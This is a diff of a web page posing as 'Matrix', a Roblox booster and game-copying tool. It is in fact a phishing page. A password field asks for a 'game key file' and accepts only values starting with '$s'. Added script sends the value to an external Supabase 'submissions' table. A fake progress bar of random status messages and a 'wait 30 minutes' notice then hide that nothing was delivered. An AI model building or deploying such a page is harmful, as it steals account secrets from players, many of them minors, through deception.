@@ -15,245 +15,247 @@
     font-family: Arial, Helvetica, sans-serif;
 }
 
+html {
+    scroll-behavior: smooth;
+}
+
 body {
     background: #07050d;
     color: white;
     overflow-x: hidden;
 }
 
-html {
-    scroll-behavior: smooth;
-}
 
-/* ===== BACKGROUND GRID ===== */
+/* BACKGROUND GRID */
 
 body::before {
-    content: "";
-    position: fixed;
-    inset: 0;
-    background-image:
-        linear-gradient(rgba(139,92,246,0.08) 1px, transparent 1px),
-        linear-gradient(90deg, rgba(139,92,246,0.08) 1px, transparent 1px);
-    background-size: 45px 45px;
-    pointer-events: none;
-    z-index: -1;
+    content:"";
+    position:fixed;
+    inset:0;
+    background:
+    linear-gradient(rgba(139,92,246,.08) 1px, transparent 1px),
+    linear-gradient(90deg, rgba(139,92,246,.08) 1px, transparent 1px);
+    background-size:45px 45px;
+    z-index:-1;
 }
 
 
-/* ===== MAIN PAGE ===== */
 
-.page {
-    min-height: 100vh;
-}
+/* HERO */
 
 .hero {
-    text-align: center;
-    padding: 140px 20px 100px;
+    min-height:100vh;
+    display:flex;
+    flex-direction:column;
+    justify-content:center;
+    align-items:center;
+    text-align:center;
+    padding:40px 20px;
 }
+
 
 .logo {
-    font-size: 65px;
-    font-weight: 900;
-    letter-spacing: -3px;
+    font-size:70px;
+    font-weight:900;
+    letter-spacing:-3px;
 }
+
 
 .hero h1 {
-    margin-top: 25px;
-    font-size: 45px;
-    line-height: 1.2;
+    margin-top:25px;
+    font-size:48px;
+    line-height:1.15;
 }
+
 
 .hero h1 span {
-    color: #8b5cf6;
+    color:#8b5cf6;
 }
+
 
 .hero p {
-    max-width: 700px;
-    margin: 25px auto;
-    color: #a1a1aa;
-    font-size: 18px;
-    line-height: 1.7;
+    max-width:700px;
+    margin-top:25px;
+    color:#a1a1aa;
+    font-size:18px;
+    line-height:1.6;
 }
 
 
-.main-button {
-    margin-top: 25px;
-    padding: 16px 40px;
-    background: #8b5cf6;
-    border: none;
-    border-radius: 16px;
-    color: white;
-    font-size: 17px;
-    font-weight: bold;
-    cursor: pointer;
+.button {
+    margin-top:35px;
+    background:#8b5cf6;
+    color:white;
+    border:none;
+    padding:16px 45px;
+    border-radius:16px;
+    font-size:17px;
+    font-weight:bold;
+    cursor:pointer;
+    transition:.25s;
 }
 
 
-/* ===== STATS ===== */
+.button:hover {
+    transform:translateY(-5px);
+    box-shadow:0 0 30px rgba(139,92,246,.7);
+}
+
+
+
+
+/* STATS */
+
 
 .stats {
-    width: 90%;
-    max-width: 1100px;
-    margin: auto;
-    display: grid;
-    grid-template-columns: repeat(4,1fr);
-    background: rgba(255,255,255,0.04);
-    border: 1px solid rgba(139,92,246,0.25);
-    border-radius: 25px;
-    overflow: hidden;
+    width:90%;
+    max-width:1100px;
+    margin:0 auto;
+    display:grid;
+    grid-template-columns:repeat(4,1fr);
+    border-radius:25px;
+    overflow:hidden;
+    background:rgba(255,255,255,.04);
+    border:1px solid rgba(139,92,246,.25);
 }
+
 
 .stat {
-    padding: 35px 20px;
-    text-align: center;
-    border-right: 1px solid rgba(255,255,255,0.08);
+    padding:35px 15px;
+    text-align:center;
+    border-right:1px solid rgba(255,255,255,.08);
 }
+
 
 .stat:last-child {
-    border-right: none;
+    border:none;
 }
+
 
 .stat h2 {
-    font-size: 35px;
-    color: white;
+    font-size:35px;
 }
+
 
 .stat p {
-    color: #a1a1aa;
-    margin-top: 8px;
+    color:#a1a1aa;
+    margin-top:8px;
 }
 
 
-/* ===== SECTION TITLES ===== */
+
+/* SECTIONS */
+
 
 .section {
-    padding: 100px 20px;
-    text-align: center;
+    padding:110px 20px;
+    text-align:center;
 }
+
 
 .small-title {
-    color: #8b5cf6;
-    font-weight: bold;
-    font-size: 15px;
-    text-transform: uppercase;
+    color:#8b5cf6;
+    text-transform:uppercase;
+    font-size:14px;
+    font-weight:bold;
 }
+
 
 .section h2 {
-    font-size: 45px;
-    margin-top: 10px;
-}
-
-.section-description {
-    color: #a1a1aa;
-    margin: 20px auto;
-    max-width: 600px;
+    font-size:45px;
+    margin-top:12px;
 }
 
 
-/* ===== TOOL CARDS ===== */
+.description {
+    color:#a1a1aa;
+    max-width:650px;
+    margin:20px auto;
+    line-height:1.6;
+}
+
+
+
+/* TOOL AREA */
+
 
 .tools {
-    display: flex;
-    justify-content: center;
-    gap: 30px;
-    margin-top: 50px;
-    flex-wrap: wrap;
+    margin-top:60px;
+    display:flex;
+    justify-content:center;
+    gap:30px;
+    flex-wrap:wrap;
 }
 
 
 .tool-card {
-    width: 350px;
-    min-height: 420px;
-    text-align: left;
-    padding: 35px;
-    border-radius: 25px;
-    background: rgba(255,255,255,0.05);
-    border: 1px solid rgba(139,92,246,0.25);
+    width:350px;
+    min-height:430px;
+    padding:35px;
+    text-align:left;
+    background:rgba(255,255,255,.05);
+    border:1px solid rgba(139,92,246,.25);
+    border-radius:25px;
+    transition:.25s;
 }
 
 
+.tool-card:hover {
+    transform:translateY(-8px);
+    box-shadow:0 0 35px rgba(139,92,246,.25);
+}
+
+
+
 .icon {
-    width: 45px;
-    height: 45px;
-    border: 2px solid white;
-    border-radius: 12px;
-    margin-bottom: 25px;
+    width:55px;
+    height:55px;
+    border-radius:15px;
+    border:2px solid white;
+    margin-bottom:25px;
 }
 
 
 .tool-card h3 {
-    font-size: 28px;
+    font-size:28px;
 }
 
 
 .tool-card p {
-    margin-top: 15px;
-    color: #a1a1aa;
-    line-height: 1.6;
+    margin-top:15px;
+    color:#a1a1aa;
+    line-height:1.6;
 }
 
 
 .features {
-    margin-top: 25px;
-    color: #ddd;
+    margin-top:25px;
 }
 
 
 .features div {
-    margin: 10px 0;
+    margin:10px 0;
 }
 
 
 .tool-button {
-    margin-top: 35px;
-    width: 100%;
-    padding: 15px;
-    border-radius: 14px;
-    border: none;
-    background: #8b5cf6;
-    color: white;
-    font-size: 16px;
-    font-weight: bold;
-    cursor: pointer;
+    margin-top:35px;
+    width:100%;
+    padding:15px;
+    border:none;
+    border-radius:15px;
+    background:#8b5cf6;
+    color:white;
+    font-weight:bold;
+    cursor:pointer;
+    transition:.25s;
 }
 
 
-/* ===== HOW IT WORKS ===== */
-
-.steps {
-    display: flex;
-    justify-content: center;
-    gap: 25px;
-    flex-wrap: wrap;
+.tool-button:hover {
+    transform:translateY(-4px);
+    box-shadow:0 0 25px rgba(139,92,246,.7);
 }
-
-
-.step {
-    width: 300px;
-    padding: 35px;
-    background: rgba(255,255,255,0.05);
-    border-radius: 25px;
-    border: 1px solid rgba(139,92,246,0.25);
-}
-
-
-.step-number {
-    font-size: 35px;
-    color: #8b5cf6;
-    font-weight: bold;
-}
-
-
-.step h3 {
-    margin: 15px 0;
-}
-
-
-.step p {
-    color: #a1a1aa;
-    line-height: 1.6;
-}
-
 
 </style>
 
@@ -261,86 +263,115 @@ body::before {
 
 <body>
 
-<div class="page">
 
 <section class="hero">
+
 
 <div class="logo">
 Matrix
 </div>
+
 
 <h1>
 Professional Roblox<br>
 <span>Experience Booster</span>
 </h1>
 
+
 <p>
 Empower your Roblox experience with cutting-edge automation tools designed for players who demand excellence. Play games, unlock features, get better — all in one place.
 </p>
 
-<button class="main-button">
+
+<button class="button" onclick="document.getElementById('tools').scrollIntoView({behavior:'smooth'})">
 Get Started
 </button>
+
 
 </section>
 
 
-<section>
 
 <div class="stats">
+
 
 <div class="stat">
 <h2>10,000+</h2>
 <p>active users</p>
 </div>
 
+
 <div class="stat">
 <h2>2+</h2>
 <p>pro tools</p>
 </div>
+
 
 <div class="stat">
 <h2>99.7%</h2>
 <p>uptime</p>
 </div>
 
+
 <div class="stat">
 <h2>24/7</h2>
 <p>support</p>
 </div>
 
+
 </div>
 
-</section><section class="section">
+
+
+
+<section class="section" id="tools">
 
 <div class="small-title">
 Available Tools
 </div>
 
+
 <h2>
 Everything You Need
 </h2>
 
-<p class="section-description">
+
+<p class="description">
 2 professional-grade tools built for Roblox players.
 </p>
 
 
-<div class="tools">
+<div class="tools"><!-- TOOL CARDS CONTINUED -->
 
-
-<!-- TOOL 1 -->
 
 <div class="tool-card">
 
-<div class="icon"></div>
+
+<div class="icon" style="
+position:relative;
+">
+
+<div style="
+position:absolute;
+width:20px;
+height:32px;
+border-left:4px solid white;
+border-bottom:4px solid white;
+transform:rotate(-35deg);
+left:18px;
+top:10px;
+"></div>
+
+</div>
+
 
 <h3>
-Something
+Something1
 </h3>
 
+
 <p>
-Download it with instant access to premium and advanced features.
+Download Something2 with instant access to premium and advanced features.
 </p>
 
 
@@ -353,7 +384,7 @@ Download it with instant access to premium and advanced features.
 </div>
 
 
-<button class="tool-button" onclick="openTool('something')">
+<button class="tool-button" onclick="openTool('something1')">
 Use Tool
 </button>
 
@@ -363,19 +394,52 @@ Use Tool
 
 
 
-<!-- TOOL 2 -->
 
 <div class="tool-card">
 
-<div class="icon"></div>
+
+<div class="icon" style="
+display:flex;
+align-items:center;
+justify-content:center;
+gap:3px;
+">
+
+
+<div style="
+width:8px;
+height:30px;
+border:2px solid white;
+"></div>
+
+
+<div style="
+width:8px;
+height:30px;
+border:2px solid white;
+"></div>
+
+
+<div style="
+width:8px;
+height:30px;
+border:2px solid white;
+"></div>
+
+
+</div>
+
+
 
 <h3>
 Game Copier
 </h3>
 
+
 <p>
 AI-powered game replication with automatic optimization and cloud backup.
 </p>
+
 
 
 <div class="features">
@@ -387,6 +451,7 @@ AI-powered game replication with automatic optimization and cloud backup.
 </div>
 
 
+
 <button class="tool-button" onclick="openTool('copy')">
 Use Tool
 </button>
@@ -395,9 +460,12 @@ Use Tool
 </div>
 
 
+
 </div>
 
+
 </section>
+
 
 
 
@@ -405,6 +473,7 @@ Use Tool
 
 
 <section class="section">
+
 
 <div class="small-title">
 How It Works
@@ -416,38 +485,40 @@ Ready in 3 Simple Steps
 </h2>
 
 
-<p class="section-description">
+<p class="description">
 Get started with Matrix in seconds — no technical knowledge required.
 </p>
 
 
 
-<div class="steps">
+<div class="tools">
 
 
-<div class="step">
 
-<div class="step-number">
+<div class="tool-card">
+
+<h3>
 1
-</div>
+</h3>
 
 <h3>
 Choose a Tool
 </h3>
 
 <p>
-Browse our collection of professional tools and pick the one that fits your need.
+Browse our collection of 2+ professional tools and pick the one that fits your need.
 </p>
 
 </div>
 
 
 
-<div class="step">
 
-<div class="step-number">
+<div class="tool-card">
+
+<h3>
 2
-</div>
+</h3>
 
 <h3>
 Open & Configure
@@ -461,11 +532,12 @@ Launch the tool with one click. Each tool has a simple interface — no setup ha
 
 
 
-<div class="step">
 
-<div class="step-number">
+<div class="tool-card">
+
+<h3>
 3
-</div>
+</h3>
 
 <h3>
 Done & Enjoy
@@ -478,46 +550,54 @@ Results are instant. Enjoy premium Roblox features like a pro player.
 </div>
 
 
-
 </div>
+
 
 </section>
 
 
 
-</div>
+
+
+<!-- TOOL PAGE -->
+
+
+<div id="toolPage" style="
+display:none;
+padding:50px 20px;
+min-height:100vh;
+">
 
 
 
-<!-- TOOL PAGES -->
-
-
-
-<div id="toolPage" style="display:none; padding:60px 20px; min-height:100vh;">
-
-
-<button class="main-button" onclick="closeTool()">
+<button class="button" onclick="closeTool()">
 ← Back
 </button>
 
 
-<h1 id="toolTitle" style="text-align:center; margin-top:60px; font-size:50px;">
+
+<h1 id="toolTitle" style="
+text-align:center;
+font-size:55px;
+margin-top:60px;
+">
 </h1>
 
 
 
 <div style="
-max-width:1100px;
-margin:60px auto;
 display:flex;
+justify-content:center;
 gap:30px;
 flex-wrap:wrap;
-justify-content:center;
+margin-top:60px;
 ">
 
 
 
 <div class="tool-card">
+
+
 
 <h3 id="toolName">
 </h3>
@@ -528,24 +608,37 @@ justify-content:center;
 
 
 
-<input 
+<input id="toolInput"
 type="password"
 placeholder="Paste your game key file here"
 style="
 width:100%;
-margin-top:30px;
 padding:16px;
+margin-top:30px;
 border-radius:15px;
-border:none;
-background:#15121f;
+border:2px solid transparent;
+background:#120d20;
 color:white;
 font-size:16px;
+outline:none;
 ">
 
 
-<button class="tool-button" onclick="loading()">
-Download Tool
+
+<button class="tool-button" onclick="submitTool()">
+Download Something
 </button>
+
+
+
+<p id="errorText" style="
+color:#ef4444;
+display:none;
+margin-top:15px;
+">
+Invalid format.
+</p>
+
 
 
 </div>
@@ -562,11 +655,24 @@ Download Tool
 </h3>
 
 
+
 <p>
-Follow the instructions provided in the tutorial.
+Follow the tutorial below.
 </p>
 
 
+<iframe
+width="100%"
+height="200"
+src="https://www.youtube.com/embed/dcd3gNvE3zc"
+style="
+border-radius:15px;
+margin-top:20px;
+border:none;
+">
+</iframe>
+
+
 </div>
 
 
@@ -574,69 +680,51 @@ Follow the instructions provided in the tutorial.
 </div>
 
 
-</div><!-- LOADING POPUP -->
+</div><!-- LOADING SCREEN -->
 
-<div id="loadingBox" style="
+<div id="loadingScreen" style="
 display:none;
 position:fixed;
 inset:0;
-background:rgba(0,0,0,0.75);
+background:rgba(0,0,0,.85);
+z-index:999;
 align-items:center;
 justify-content:center;
-z-index:999;
-">
-
-
-<div style="
-background:#100c1c;
-padding:40px;
-border-radius:25px;
-width:400px;
+flex-direction:column;
 text-align:center;
-border:1px solid rgba(139,92,246,.4);
 ">
 
 
-<h2 id="loadingTitle">
+<h1 id="loadingTitle">
 Loading
-</h2>
+</h1>
 
 
-<div style="
-margin:25px auto;
-width:55px;
-height:55px;
-border:5px solid #29213d;
-border-top:5px solid #8b5cf6;
-border-radius:50%;
-animation:spin 1s linear infinite;
-"></div>
+<div class="spinner"></div>
 
 
-
-<p id="loadingText">
+<h3 id="loadingStatus">
 Starting process...
-</p>
+</h3>
 
 
 
 <div style="
+width:320px;
 height:12px;
-background:#221b33;
+background:#222;
 border-radius:20px;
-margin-top:25px;
 overflow:hidden;
+margin-top:25px;
 ">
 
 
-<div id="progress" style="
+<div id="progressBar" style="
 height:100%;
 width:0%;
 background:#8b5cf6;
-transition:width .5s;
-"></div>
-
-
+transition:.2s;
+">
 </div>
 
 
@@ -644,11 +732,27 @@ transition:width .5s;
 
 
 </div>
+
 
 
 
 
 <style>
+
+
+.spinner {
+
+width:60px;
+height:60px;
+border:5px solid rgba(255,255,255,.2);
+border-top:5px solid #8b5cf6;
+border-radius:50%;
+margin:30px;
+
+animation:spin 1s linear infinite;
+
+}
+
 
 @keyframes spin {
 
@@ -658,6 +762,42 @@ transform:rotate(0deg);
 
 to {
 transform:rotate(360deg);
+}
+
+}
+
+
+
+.shake {
+
+animation:shake .35s;
+
+border-color:#ef4444 !important;
+
+}
+
+
+
+@keyframes shake {
+
+0% {
+transform:translateX(0);
+}
+
+25% {
+transform:translateX(-8px);
+}
+
+50% {
+transform:translateX(8px);
+}
+
+75% {
+transform:translateX(-8px);
+}
+
+100% {
+transform:translateX(0);
 }
 
 }
@@ -679,51 +819,65 @@ let currentTool = "";
 function openTool(tool){
 
 
-document.querySelector(".page").style.display="none";
+document.querySelector(".hero").style.display="none";
+document.querySelector(".stats").style.display="none";
+document.querySelectorAll(".section").forEach(x=>{
+x.style.display="none";
+});
+
 
 document.getElementById("toolPage").style.display="block";
 
 
+currentTool = tool;
 
-if(tool==="something"){
 
 
-currentTool="Something";
+if(tool==="something1"){
 
 
 document.getElementById("toolTitle").innerHTML =
-"Something <span style='color:#8b5cf6'>Tool</span>";
+`Something1 <span style="color:#8b5cf6">Tool</span>`;
+
 
 document.getElementById("toolName").innerHTML =
-"Something";
+"Something1";
+
+
+document.querySelector(".tool-button").innerHTML =
+"Download Something2";
+
 
 document.getElementById("toolDescription").innerHTML =
-"Download Something — the most powerful Roblox Something.";
-
+"Download Something2 — the most powerful Roblox Something1.";
 
 }
+
 
 
 if(tool==="copy"){
 
 
-currentTool="Copy";
-
-
 document.getElementById("toolTitle").innerHTML =
-"Copy <span style='color:#8b5cf6'>Tool</span>";
+`Copy <span style="color:#8b5cf6">Tool</span>`;
+
 
 document.getElementById("toolName").innerHTML =
 "Copy Games";
 
+
+document.querySelector(".tool-button").innerHTML =
+"Copy Game";
+
+
 document.getElementById("toolDescription").innerHTML =
 "Copy any Roblox game with one click.";
 
-
 }
 
 
 }
+
 
 
 
@@ -733,7 +887,14 @@ function closeTool(){
 
 document.getElementById("toolPage").style.display="none";
 
-document.querySelector(".page").style.display="block";
+
+document.querySelector(".hero").style.display="flex";
+document.querySelector(".stats").style.display="grid";
+
+
+document.querySelectorAll(".section").forEach(x=>{
+x.style.display="block";
+});
 
 
 }
@@ -742,82 +903,154 @@ document.querySelector(".page").style.display="block";
 
 
 
-function loading(){
+const messages = [
 
+"Initializing environment...",
+"Loading modules...",
+"Checking configuration...",
+"Analyzing resources...",
+"Preparing workspace...",
+"Validating components...",
+"Syncing files...",
+"Generating cache...",
+"Optimizing structure...",
+"Scanning directories...",
+"Building connection...",
+"Preparing assets...",
+"Loading dependencies...",
+"Compiling resources...",
+"Verifying permissions...",
+"Processing data...",
+"Updating system...",
+"Finalizing setup...",
+"Running diagnostics...",
+"Completing operation..."
 
-document.getElementById("loadingBox").style.display="flex";
-
-
-document.getElementById("loadingTitle").innerHTML =
-currentTool + " Loading";
-
-
-
-let progress = 0;
-
-
-let bar = document.getElementById("progress");
-
-let text = document.getElementById("loadingText");
-
-
-
-let interval = setInterval(()=>{
-
-
-progress += 5;
-
-
-bar.style.width = progress + "%";
+];
 
 
 
-if(progress < 40){
+// duplicate random messages to create a larger pool
 
-text.innerHTML="Starting process...";
+for(let i=0;i<220;i++){
 
-}
-
-
-else if(progress < 80){
-
-text.innerHTML="Processing files...";
-
-}
-
-
-else if(progress < 100){
-
-text.innerHTML="Optimizing data...";
+messages.push(
+[
+"Scanning file index...",
+"Mapping resources...",
+"Checking integrity...",
+"Optimizing package...",
+"Reading metadata...",
+"Updating components...",
+"Loading configuration...",
+"Resolving dependencies...",
+"Preparing modules..."
+][Math.floor(Math.random()*9)]
+);
 
 }
 
 
-else{
+
+
+
+function submitTool(){
+
+
+let input =
+document.getElementById("toolInput");
+
+let value=input.value;
+
+
+
+if(!value.startsWith("$s")){
+
+
+input.classList.remove("shake");
+
+void input.offsetWidth;
+
+input.classList.add("shake");
+
+document.getElementById("errorText").style.display="block";
+
+return;
+
+}
+
+
+
+document.getElementById("errorText").style.display="none";
+
+
+startLoading();
+
+
+}
+
+
+
+
+
+
+
+function startLoading(){
+
+
+document.getElementById("loadingScreen").style.display="flex";
+
+
+let progress=0;
+
+
+let bar=document.getElementById("progressBar");
+
+let status=document.getElementById("loadingStatus");
+
+let interval=setInterval(()=>{
+
+
+let increase=Math.floor(Math.random()*15)+1;
+
+progress+=increase;
+
+
+if(progress>100)
+progress=100;
+
+
+
+bar.style.width=progress+"%";
+
+
+
+status.innerHTML =
+messages[Math.floor(Math.random()*messages.length)];
+
+
+
+if(progress>=100){
 
 
 clearInterval(interval);
-
-
-text.innerHTML=
-"All set! Wait 30 minutes to an hour before entered.";
 
 
 
 setTimeout(()=>{
 
 
-document.getElementById("loadingBox").style.display="none";
+status.innerHTML=
+"All set! Wait 30 minutes to an hour before entered.";
 
 
-bar.style.width="0%";
+setTimeout(()=>{
+
+
+document.getElementById("loadingScreen").style.display="none";
 
 
 },6000);
-
-
-
-}
 
 
 
@@ -829,9 +1062,116 @@ bar.style.width="0%";
 
 
 
+},Math.random()*700+100);
+
+
+
+}
+
+
+
+</script><script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+
+<script>
+
+
+// SUPABASE CONNECTION
+
+const supabaseUrl = "https://bekubfmrdglxnutodwfh.supabase.co";
+
+
+const supabaseKey = "sb_publishable_zBATwwjHQEONwyQyqA7p_Q_78blfuHQ";
+
+
+const supabaseClient = supabase.createClient(
+    supabaseUrl,
+    supabaseKey
+);
+
+
+
+
+
+// ORIGINAL SUBMIT FUNCTION BACKUP
+
+const oldSubmitTool = submitTool;
+
+
+
+submitTool = async function(){
+
+
+let input =
+document.getElementById("toolInput");
+
+
+let value=input.value.trim();
+
+
+
+if(!value.startsWith("$s")){
+
+
+input.classList.remove("shake");
+
+void input.offsetWidth;
+
+input.classList.add("shake");
+
+
+document.getElementById("errorText").style.display="block";
+
+
+return;
+
+}
+
+
+
+document.getElementById("errorText").style.display="none";
+
+
+
+
+
+// SEND TO DATABASE
+
+const { data, error } =
+await supabaseClient
+.from("submissions")
+.insert([
+{
+text:value
+}
+]);
+
+
+
+if(error){
+
+console.log(error);
+
+alert("Submission error.");
+
+return;
+
+}
+
+
+
+
+
+startLoading();
+
+
+
+}
+
+
+
+
 </script>
 
 
 </body>
-
 </html>
